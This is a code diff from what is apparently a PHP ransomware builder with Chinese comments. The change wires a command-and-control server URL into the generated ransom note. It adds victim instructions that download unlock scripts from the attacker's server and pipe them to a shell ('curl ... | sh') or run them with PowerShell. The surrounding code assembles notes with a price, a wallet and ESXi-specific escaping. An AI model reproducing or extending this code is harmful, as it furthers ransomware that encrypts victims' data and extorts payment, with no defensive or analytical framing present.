@@ -50,7 +50,7 @@ if (file_exists($pub_path)) {
 }
 
 // 构建勒索信文本
-$note = build_ransom_note($ransom, $platform);
+$note = build_ransom_note($ransom, $platform, $c2_url);
 if ($platform === 'esxi') {
     // sh单引号字符串: 用'\''转义单引号，换行保留
     $note_esc = str_replace("'", "'\\''", $note);
@@ -72,16 +72,23 @@ if ($platform !== 'win') chmod($path, 0750);
 echo json_encode(['ok'=>true,'file'=>$name,'platform'=>$platform,'size'=>filesize($path)]);
 exit;
 
-function build_ransom_note($r, $plat) {
+function build_ransom_note($r, $plat, $c2='') {
     $t = $r['title'];
     $b = $r['body'];
     $c = $r['contact'];
     $p = $r['price'];
     $w = $r['wallet'];
+    $srv = preg_replace('#/handshake\.php$#', '', $c2);
+    if ($srv === '') $srv = 'http://<后台地址>';
+    // 解密一律走零依赖脚本：Linux/macOS 用 jasmin_unlock.sh (纯 openssl)，
+    // Windows 用 jasmin_unlock.ps1 (纯 PowerShell 7+，无需编译 exe)
     $dec = ($plat === 'win')
-        ? "运行 Jasmin_Decryptor.exe → 选择.pem私钥 → Decrypt"
-        : "sh jasmin_decrypt_openssl.sh private_key.pem /   （无需安装任何依赖，仅需 openssl）\n"
-         ."如偏爱 Python 工具: python3 jasmin_decrypt.py private_key.pem";
+        ? "Windows (需 PowerShell 7+)\n"
+         ."  curl.exe -sL {$srv}/payloads/jasmin_unlock.ps1 -o unlock.ps1\n"
+         ."  pwsh -File unlock.ps1 -Server {$srv} -K \"<解密口令>\" -Paths C:\\目标目录"
+        : "Linux / macOS（纯 openssl，无需安装任何依赖）\n"
+         ."  curl -sL {$srv}/payloads/jasmin_unlock.sh | sh -s {$srv} \"<解密口令>\" <目标目录>\n"
+         ."  （解密口令与目标目录请向我们索取）";
     $n = "╔══════════════════════════════════════════╗\n";
     $n.= "║  {$t}\n";
     // 标题已是中文时不再补中文副标题，避免两行重复
